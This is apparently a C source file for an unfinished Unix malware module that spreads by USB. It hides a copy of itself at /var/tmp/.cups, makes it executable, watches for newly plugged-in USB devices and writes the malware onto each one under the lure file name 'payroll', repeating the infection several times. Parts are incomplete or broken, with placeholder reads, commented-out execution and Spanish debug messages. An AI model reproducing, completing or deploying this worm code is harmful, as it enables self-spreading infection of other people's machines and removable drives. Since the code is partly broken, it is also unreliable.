#include "unix_usb_spreader.h"
#include "mount_info.h"
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <dirent.h>
#include "files.h"
#include "string_utils.h"
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#define POLL_INTERVAL 10
//static const char *EXECUTABLE_SYSPATH = "/var/tmp/.cups";
#define EXECUTABLE_SYSPATH "/var/tmp/.cups"

bool isFromMalwarePath(char *argZero) {
    //return global->strncmp(EXECUTABLE_SYSPATH, argZero, global->strlen(EXECUTABLE_SYSPATH)) == 0;
    return 0;
}


int copyToMwareSysPath(char *currentMalwarePath) {
    // implementation to copy (write file?)
    DEBUG_LOG("aqui1\n");

    size_t malwareFileSize;
    DEBUG_LOG("aqui, estoy cansado jefe. path malware: %s\n", currentMalwarePath);

    char *rawMalwareContent = readfile("hola");
    //char *rawMalwareContent = readBinaryFile(currentMalwarePath, &malwareFileSize);
    if (rawMalwareContent == NULL) {
        DEBUG_LOG_ERR("[USB] unable to read self exec binary\n");
        return -1;
    }

    DEBUG_LOG("aqui2\n");

    int statusCode = writeBinaryFile(rawMalwareContent, "/var/tmp", ".cups", malwareFileSize);
    if (statusCode != 0) {
        DEBUG_LOG_ERR("[USB] unable to copy malware to system path\n");
        return statusCode;
    }
    DEBUG_LOG("aqui3\n");


    // Ensure the copied file is executable
    if (global->chmod("/var/tmp/.cups", 0755) < 0) {
        DEBUG_LOG_ERR("[USB] fail to chmod malware in syspath\n");
        return -1;
    }
    DEBUG_LOG("aqui4\n");

    //statusCode = global->execl(EXECUTABLE_SYSPATH, EXECUTABLE_SYSPATH, NULL);
    return statusCode;
}

int spreadUSBs(const char* malwareFileName) {
    size_t countMounts = 0;
    Mounts* mounts = parseMountsFile(&countMounts);
    if (!mounts) {
        DEBUG_LOG_ERR("[USB] unable to parse mount information");
        return -1;
    }

    int i;  

    int countUsbMounts = 0;
    // filter out non-usb mounts
    for (i = 0; i < countMounts; i++) {
        if (isUSBMount(mounts[i].device, mounts[i].mountPoint)) {
            countUsbMounts++;
        }
    }

    int j = 0;
    Mounts *usbMounts = (Mounts *) global->malloc(countUsbMounts * sizeof(Mounts));
    if (usbMounts == NULL) {
        DEBUG_LOG_ERR("[USB] unable to alloc memory for usb mounts\n");
        return -1;
    }
    for (i = 0; i < countMounts; i++) {
        if (isUSBMount(mounts[i].device, mounts[i].mountPoint)) {
            usbMounts[j] = mounts[i];
            j++;
        }
    }

    char* malwareContent = readfile(EXECUTABLE_SYSPATH);
    if (malwareContent == NULL) {
        DEBUG_LOG_ERR("[USB] fail to read malware content\n");
        return -1;
    }
    
    //infection process
    for (j = 0; j < countUsbMounts; j++) {
        if (writeFile(malwareContent, usbMounts[j].mountPoint, malwareFileName) != 0) {
            char errMsg[300];
            global->snprintf(errMsg, global->strlen(errMsg), "[USB] failed to write file in %s, but still continuing\n", usbMounts[j].mountPoint);
            DEBUG_LOG_ERR(errMsg);
        }
    }
    
    global->free(mounts);
    global->free(usbMounts);

    return 0;
}

int startUSBInfector(char *argZero) {
    char oldDevices[128][256];
    char newDevices[128][256];
    int oldCount = 0;
    char *usbFileName = "payroll";

    // Get the initial list of devices
    oldCount = getUSBSysDevices(oldDevices, 128);

    while (1) {
        global->sleep(POLL_INTERVAL);

        // Get the new list of devices
        int newCount = getUSBSysDevices(newDevices, 128);

        if (newCount == -1) {
            DEBUG_LOG_ERR("[USB] fail to read usb devices in /sys\n");
            break;
        }

        // Compare old and new lists
        int deviceWasAdded = compareDeviceLists(oldDevices, oldCount, newDevices, newCount);
        if (deviceWasAdded) {
            //give some time for the device to be automatically mounted, or mounted by the user
            DEBUG_LOG("[USB] Device was added, infecting and waiting 10s\n");
            spreadUSBs(usbFileName);
            global->sleep(10);
            DEBUG_LOG("[USB] Infecting again, waiting 60s\n");
            spreadUSBs(usbFileName);
            global->sleep(60);
            DEBUG_LOG("[USB] Last infection\n");
            spreadUSBs(usbFileName);
        }

        // Update the old list
        global->memcpy(oldDevices, newDevices, sizeof(newDevices));
        oldCount = newCount;
    }

    return 0;
}

int usb_spread_module(Globals * glob) {
    global = glob;
    int statusCode = 0;
    char *executedFromFilename = global->malware_path;

    //continue tomorrow, use same function as copy malware in propagate module (mutate, etc)
    // also see why when entering "files.c" it crashes

    if (isFromMalwarePath(executedFromFilename)) {
    //if (1) {
        DEBUG_LOG("[USB] Starting infect loop\n");
        //statusCode = startUSBInfector(executedFromFilename);
    } else {
        DEBUG_LOG("[USB] Copying malware to system path and running it...\n");
        statusCode = copyToMwareSysPath(executedFromFilename);
        if (statusCode != 0) {
            DEBUG_LOG_ERR("[USB] fail to copy malware to system path\n");
        }
    }

    return statusCode;
}
